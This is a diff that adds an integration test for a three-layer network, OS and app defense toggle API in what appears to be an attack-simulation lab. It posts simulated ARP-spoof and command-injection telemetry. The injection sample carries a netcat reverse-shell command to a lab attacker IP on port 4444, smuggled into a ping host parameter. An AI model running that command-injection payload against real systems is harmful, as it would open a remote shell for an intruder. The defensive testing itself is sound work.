@@ -396,4 +396,82 @@ test('hub integration contracts', { timeout: 15000 }, async (t) => {
     assert.equal(resetOs.fd_metrics.status, 'NORMAL');
     assert.equal(resetOs.fd_metrics.open_fds, 42);
   });
+
+  await t.test('W5-T1 Phase 1: 3-Layer Defense Funnel contract (independent L1 Network, L2 OS, and L3 App toggles)', async () => {
+    // 1. Initial status exposes all 3 defense layers
+    const status0 = (await api('/api/defense/status')).data;
+    assert.equal(status0.defense_l1_network, false);
+    assert.equal(status0.defense_l2_os, false);
+    assert.equal(typeof status0.defense_l3_app, 'boolean');
+    assert.equal(status0.defense_layers.l1_network, false);
+    assert.equal(status0.defense_layers.l2_os, false);
+
+    // 2. Poison ARP cache first, then enable L1 Network Shield -> automatically restores clean Static ARP & blocks ARP/SYN/RST
+    await api('/api/telemetry', {
+      endpoint: '/L2/arp-spoof',
+      status_code: 200,
+      method: 'ARP',
+      response_time: 1,
+      client_ip: '172.20.0.66',
+      attack_tag: 'ARP_SPOOF',
+      is_suspicious: true,
+      payload_summary: {},
+    });
+    assert.equal((await api('/api/telemetry/network')).data.network_state.mitm_active, true);
+
+    const l1On = (await api('/api/defense/toggle', { layer: 'l1', enabled: true })).data;
+    assert.equal(l1On.success, true);
+    assert.equal(l1On.layer, 'l1');
+    assert.equal(l1On.defense_l1_network, true);
+    assert.equal(l1On.defense_layers.l1_network, true);
+
+    // Verify L1 side-effect: MitM is cleared and subsequent ARP spoof is blocked by Static ARP
+    const netAfterL1 = (await api('/api/telemetry/network')).data.network_state;
+    assert.equal(netAfterL1.mitm_active, false);
+    await api('/api/telemetry', {
+      endpoint: '/L2/arp-spoof',
+      status_code: 200,
+      method: 'ARP',
+      response_time: 1,
+      client_ip: '172.20.0.66',
+      attack_tag: 'ARP_SPOOF',
+      is_suspicious: true,
+      payload_summary: {},
+    });
+    assert.equal((await api('/api/telemetry/network')).data.network_state.mitm_active, false);
+
+    // 3. Turn off L3 so Command Injection can reach OS, then verify L2 OS Shield blocks Reverse Shell & caps FDs at 512
+    await api('/api/defense/toggle', { layer: 'l3', enabled: false });
+    const l2On = (await api('/api/defense/toggle', { layer: 'l2', enabled: true })).data;
+    assert.equal(l2On.success, true);
+    assert.equal(l2On.layer, 'l2');
+    assert.equal(l2On.defense_l2_os, true);
+    assert.equal(l2On.defense_layers.l2_os, true);
+
+    // Send Command Injection while L3 is OFF but L2 is ON -> L2 nologin/cgroups prevents Reverse Shell spawn
+    await api('/api/telemetry', {
+      endpoint: '/api/system/network-ping?host=127.0.0.1;nc%20-e%20/bin/sh%20172.20.0.66%204444',
+      status_code: 200,
+      method: 'GET',
+      response_time: 15,
+      client_ip: '172.20.0.66',
+      attack_tag: 'COMMAND_INJECTION',
+      is_suspicious: true,
+      defense_action: 'allowed',
+      payload_summary: { shell_cmd: 'nc -e /bin/sh 172.20.0.66 4444' },
+    });
+    const osWithL2 = (await api('/api/telemetry/os')).data.os_l7_state;
+    assert.equal(osWithL2.reverse_shell.active, false);
+    assert.equal(osWithL2.fd_metrics.max_fds, 512);
+
+    // 4. Invalid layer returns 400
+    assert.equal((await api('/api/defense/toggle', { layer: 'l99' })).status, 400);
+
+    // Reset L1 & L2 back to false
+    await api('/api/defense/toggle', { layer: 'l1', enabled: false });
+    await api('/api/defense/toggle', { layer: 'l2', enabled: false });
+    const finalDefense = (await api('/api/defense/status')).data;
+    assert.equal(finalDefense.defense_l1_network, false);
+    assert.equal(finalDefense.defense_l2_os, false);
+  });
 });
